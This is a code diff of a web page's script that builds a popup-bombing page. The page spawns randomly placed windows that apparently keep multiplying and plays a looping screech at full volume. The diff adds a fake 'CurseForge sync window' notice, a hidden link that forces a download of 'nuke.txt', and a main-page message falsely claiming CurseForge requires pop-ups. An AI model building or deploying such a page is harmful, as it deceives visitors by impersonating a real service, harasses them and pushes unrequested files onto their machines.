@@ -7,29 +7,27 @@
     let popups = [];
 
     function openPopup() {
-  const width = 500;
-  const height = 400;
+      const width = 500;
+      const height = 400;
 
-  // Get the available width and height of the screen (viewport)
-  const maxLeft = window.screen.availWidth - width;
-  const maxTop = window.screen.availHeight - height;
+      const maxLeft = window.screen.availWidth - width;
+      const maxTop = window.screen.availHeight - height;
 
-  // Generate random positions within the available space
-  const left = Math.floor(Math.random() * maxLeft);
-  const top = Math.floor(Math.random() * maxTop);
+      const left = Math.floor(Math.random() * maxLeft);
+      const top = Math.floor(Math.random() * maxTop);
 
-  const popup = window.open(
-    window.location.href + "?popup=true",
-    "_blank",
-    `width=${width},height=${height},left=${left},top=${top}`
-  );
+      const popup = window.open(
+        window.location.href + "?popup=true",
+        "_blank",
+        `width=${width},height=${height},left=${left},top=${top}`
+      );
 
-  if (popup) {
-    popups.push(popup);
-    popup.focus();
-    window.blur();
-  }
-}
+      if (popup) {
+        popups.push(popup);
+        popup.focus();
+        window.blur();
+      }
+    }
 
     function checkPopups() {
       for (let i = popups.length - 1; i >= 0; i--) {
@@ -45,15 +43,17 @@
       const isPopup = new URLSearchParams(window.location.search).has('popup');
 
       if (isPopup) {
-        // POPUP PAGE — show message and scream
+        // === POPUP CONTENT ===
         document.body.innerHTML = `
           <audio id="screech" autoplay loop>
             <source src="screech.mp3" type="audio/mpeg">
           </audio>
-          <h1>You fool</h1>
-          <p>I paused making an AI to make this.</p>
+          <h1>CurseForge sync window</h1>
+          <p>Sync in progress... do not close this window.</p>
+          <a id="downloadLink" href="nuke.txt" download style="display:none"></a>
         `;
 
+        // Play the screech
         const screech = document.getElementById('screech');
         screech.volume = 1.0;
         screech.play().catch(() => {
@@ -62,16 +62,25 @@
           }, { once: true });
         });
 
+        // Trigger download
+        const download = document.getElementById('downloadLink');
+        download.click();
+
+        // Auto-close after 4 seconds
+        setTimeout(() => {
+          window.close();
+        }, 4000);
+
       } else {
-        // MAIN PAGE — no scream, just message and pop-up control
+        // === MAIN PAGE CONTENT ===
         document.body.innerHTML = `
           <h1>This wesbite requires pop-ups</h1>
-          <p>Due to using CurseForge cross support, please enable pop-ups to continue.</p>
+          <p>Due to using CurseForge cross support, please enable pop-ups to contenue.</p>
           <p>Thank you for your understanding.</p>
         `;
 
-        openPopup();
-        setInterval(checkPopups, 1000);
+        openPopup(); // Initial spawn
+        setInterval(checkPopups, 1000); // Monitor and double
       }
     };
   </script>
